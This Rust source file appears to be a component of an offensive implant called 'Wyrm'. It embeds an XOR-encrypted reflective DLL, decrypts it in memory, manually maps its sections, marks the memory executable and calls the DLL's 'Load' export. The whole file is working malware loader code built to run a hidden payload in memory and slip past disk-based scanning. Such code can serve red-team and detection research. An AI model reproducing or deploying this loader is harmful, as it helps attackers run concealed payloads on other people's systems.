use core::{
    ffi::{CStr, c_void},
    mem::transmute,
    ptr::{copy_nonoverlapping, null_mut, read_unaligned},
};

use windows_sys::Win32::System::{
    Diagnostics::Debug::{IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER},
    Memory::{
        MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAlloc,
        VirtualFree, VirtualProtect,
    },
    SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY},
};

const DLL_BYTES: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/rdll_encrypted.bin"));
const ENCRYPTION_KEY: u8 = 0x90;

/// Inject the rDLL into our **current** process
pub fn inject_current_process() {
    //
    // First decrypt the bytes into a vec
    //

    unsafe {
        //
        // Allocate memory for the encrypted PE, and decrypt in place
        //
        let p_decrypt = VirtualAlloc(
            null_mut(),
            DLL_BYTES.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if p_decrypt.is_null() {
            return;
        }

        // Copy the bytes into it
        copy_nonoverlapping(DLL_BYTES.as_ptr(), p_decrypt as _, DLL_BYTES.len());

        // Decrypt the memory
        for i in 0..DLL_BYTES.len() as usize {
            let b = (p_decrypt as *mut u8).add(i);
            *b ^= ENCRYPTION_KEY;
        }

        //
        // Now operate on the decrypted PE
        //

        let dos = read_unaligned(p_decrypt as *const IMAGE_DOS_HEADER);
        let nt = read_unaligned(p_decrypt.add(dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);

        // Allocate memory for the Wyrm RDLL
        let p_alloc = VirtualAlloc(
            null_mut(),
            nt.OptionalHeader.SizeOfImage as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        let nt_ptr = p_decrypt.add(dos.e_lfanew as usize) as *const u8;
        write_payload(p_alloc, p_decrypt as *mut u8, nt_ptr, &nt);

        let mapped_nt_ptr = (p_alloc as usize + dos.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

        // Free the decryption scratchpad
        VirtualFree(p_decrypt, 0, MEM_RELEASE);

        //
        // Find the 'Load' export and call the reflective loader (which exists in `Load``)
        //
        if let Some(load_fn) = find_export_address(p_alloc, mapped_nt_ptr, "Load") {
            let mut old_protect = 0;
            let _ = VirtualProtect(
                p_alloc,
                nt.OptionalHeader.SizeOfImage as usize,
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            );
            let reflective_load: unsafe extern "system" fn(*mut c_void) -> u32 = transmute(load_fn);

            // Call the export and hope for the best! :D
            reflective_load(p_alloc);
        }
    }
}

/// Write the PE to an allocated region of memory
fn write_payload(
    new_base_ptr: *mut c_void,
    old_base_ptr: *mut u8,
    nt_headers_ptr: *const u8,
    nt_headers: &IMAGE_NT_HEADERS64,
) {
    unsafe {
        let section_header_offset = (nt_headers_ptr as usize - old_base_ptr as usize)
            + size_of::<u32>()
            + size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>()
            + nt_headers.FileHeader.SizeOfOptionalHeader as usize;

        let section_header_ptr =
            old_base_ptr.add(section_header_offset) as *const IMAGE_SECTION_HEADER;

        //
        // Enumerate sections
        //
        for i in 0..nt_headers.FileHeader.NumberOfSections {
            // Read section header unaligned
            let header_i = read_unaligned(section_header_ptr.add(i as usize));

            let dst_ptr = new_base_ptr
                .cast::<u8>()
                .add(header_i.VirtualAddress as usize);
            let src_ptr = old_base_ptr.add(header_i.PointerToRawData as usize);
            let raw_size = header_i.SizeOfRawData as usize;

            // Copy section data
            copy_nonoverlapping(src_ptr, dst_ptr, raw_size);
        }

        // Copy PE Headers
        copy_nonoverlapping(
            old_base_ptr,
            new_base_ptr as *mut u8,
            nt_headers.OptionalHeader.SizeOfHeaders as usize,
        );
    }
}

#[inline(always)]
fn find_export_address(
    base: *mut c_void,
    nt: *mut IMAGE_NT_HEADERS64,
    name: &str,
) -> Option<unsafe extern "system" fn()> {
    unsafe {
        let dir = (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize];
        if dir.VirtualAddress == 0 || dir.Size == 0 {
            return None;
        }

        let exp_dir: *mut IMAGE_EXPORT_DIRECTORY = get_rva(base as _, dir.VirtualAddress as usize);

        if exp_dir.is_null() {
            return None;
        }

        let exp = read_unaligned(exp_dir);

        let names: *const u32 = get_rva(base as _, exp.AddressOfNames as usize);
        let funcs: *const u32 = get_rva(base as _, exp.AddressOfFunctions as usize);
        let ords: *const u16 = get_rva(base as _, exp.AddressOfNameOrdinals as usize);

        //
        // Iterate over the exported names searching for the exported function
        //
        for i in 0..exp.NumberOfNames {
            let name_rva = read_unaligned(names.add(i as usize)) as usize;
            let name_ptr = get_rva::<u8>(base as _, name_rva);
            let export_name = CStr::from_ptr(name_ptr as _).to_str().ok();
            if export_name == Some(name) {
                let ord_index = read_unaligned(ords.add(i as usize)) as usize;
                let func_rva = read_unaligned(funcs.add(ord_index)) as usize;
                let func_ptr = get_rva::<u8>(base as _, func_rva) as usize;
                return Some(transmute::<usize, unsafe extern "system" fn()>(func_ptr));
            }
        }

        // Did not find exported function
        None
    }
}

fn get_rva<T>(base_ptr: *mut u8, offset: usize) -> *mut T {
    (base_ptr as usize + offset) as *mut T
}
